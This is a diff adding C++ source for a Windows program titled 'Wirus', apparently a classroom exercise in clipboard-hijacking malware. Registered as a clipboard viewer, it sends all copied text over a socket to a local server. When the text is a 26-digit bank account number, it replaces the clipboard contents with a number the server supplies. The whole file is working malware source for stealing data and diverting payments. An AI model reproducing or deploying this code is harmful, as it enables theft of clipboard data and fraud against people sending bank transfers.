@@ -1,0 +1,179 @@
+#define _CRT_SECURE_NO_WARNINGS
+#include <Windows.h>
+
+#pragma comment(lib, "WSOCK32.lib")
+
+static HWND hwndNxtVwr;
+SOCKET sock;
+bool ignore = false;
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+void readClipboard(HWND hwnd);
+
+//main
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
+{
+	//okienko
+	const wchar_t CLASS_NAME[] = L"Lorem Ipsum";
+
+	WNDCLASS wc = {};
+
+	wc.lpfnWndProc = WindowProc;
+	wc.hInstance = hInstance;
+	wc.lpszClassName = CLASS_NAME;
+
+	RegisterClass(&wc);
+
+	HWND hwnd = CreateWindowEx(
+		0,
+		CLASS_NAME,
+		L"Wirus",
+		WS_OVERLAPPEDWINDOW,
+
+		600, 200, 300, 300,
+		NULL, NULL, hInstance, NULL
+	);
+	MSG message;
+
+	ShowWindow(hwnd, nCmdShow);
+	struct sockaddr_in sa;
+	WSADATA wsas;
+	WORD ver;
+	ver = MAKEWORD(2, 0);
+	WSAStartup(ver, &wsas);
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	memset((void*)(&sa), 0, sizeof(sa));
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(55666);
+	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+	int result;
+	result = connect(sock, (struct sockaddr FAR*) & sa, sizeof(sa));
+
+	if (result == SOCKET_ERROR)
+	{
+		MessageBoxA(hwnd, "Unable to connect", "Unable to connect", 0);
+		return 1;
+	}
+	while (GetMessage(&message, (HWND)NULL, 0, 0))
+	{
+		TranslateMessage(&message);
+		DispatchMessage(&message);
+	}
+
+	closesocket(sock);
+	WSACleanup();
+	return message.wParam;
+}
+
+bool ifTextAccNumber(char* text)
+{
+	int length = 0;
+	int textLen = strlen(text);
+	for (int i = 0; i < textLen; i++)
+	{
+		if ((text[i] < '0' || text[i] > '9') && text[i] != ' ')
+		{
+			return false;
+		}
+		else if (text[i] != ' ')
+		{
+
+			length++;
+		}
+	}
+	if (length == 26)
+		return true;
+	return false;
+}
+
+void readClipboard(HWND hwnd)
+{
+	if (IsClipboardFormatAvailable(CF_TEXT))
+	{
+		OpenClipboard(NULL);
+		HANDLE hCbMem = GetClipboardData(CF_TEXT);
+		HANDLE hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
+		if (hProgMem != NULL)
+		{
+			LPSTR lpCbMem = (LPSTR)GlobalLock(hCbMem);
+			LPSTR lpProgMem = (LPSTR)GlobalLock(hProgMem);
+			strcpy(lpProgMem, lpCbMem);
+
+			GlobalUnlock(hCbMem);
+			GlobalUnlock(hProgMem);
+			CloseClipboard();
+
+			char buf[100] = { '\0' };
+			strcpy(buf, lpProgMem);
+			
+			send(sock, buf, 100, 0);
+			
+			if (ifTextAccNumber(buf))
+			{
+				if (recv(sock, buf, 100, 0) > 0)
+				{
+					unsigned int wLen = strlen(buf);
+					HGLOBAL hCbMem2 = GlobalAlloc(GHND, (DWORD)wLen + 1);
+					LPVOID lpCbMem2 = GlobalLock(hCbMem2);
+					char* cpCbMem = (char*)lpCbMem;
+					char* cpProgMem = (char*)lpProgMem;
+					memcpy(lpCbMem2, buf, wLen + 1);
+					GlobalUnlock(hCbMem2);
+
+					ignore = true;
+
+					OpenClipboard(hwnd);
+					EmptyClipboard();
+					SetClipboardData(CF_TEXT, hCbMem2);
+					CloseClipboard();
+				}
+			}
+
+		}
+	}
+}
+//12341234123412341234123412
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+	switch (message)
+	{
+	case WM_CREATE:
+		hwndNxtVwr = SetClipboardViewer(hwnd);
+		return (0);
+
+	case WM_DESTROY:
+		ChangeClipboardChain(hwnd, hwndNxtVwr);
+		PostQuitMessage(0);
+		return (0);
+
+	case WM_CHANGECBCHAIN:
+		if (wParam == (WORD)hwndNxtVwr) 
+		{
+			hwndNxtVwr = (HWND)LOWORD(lParam); 
+		}
+		else
+		{
+			if (hwndNxtVwr != NULL)  
+			{
+				SendMessage(hwndNxtVwr, message, wParam, lParam);
+			}
+		}
+		return (0);
+
+	case WM_DRAWCLIPBOARD:
+		if (!ignore)
+		{
+			readClipboard(hwnd);
+			ignore = false;
+		}
+		if (hwndNxtVwr != NULL)
+		{
+			SendMessage(hwndNxtVwr, message, wParam, lParam);
+		}
+		return (0);
+
+	default:
+		return DefWindowProc(hwnd, message, wParam, lParam);
+	}
+}
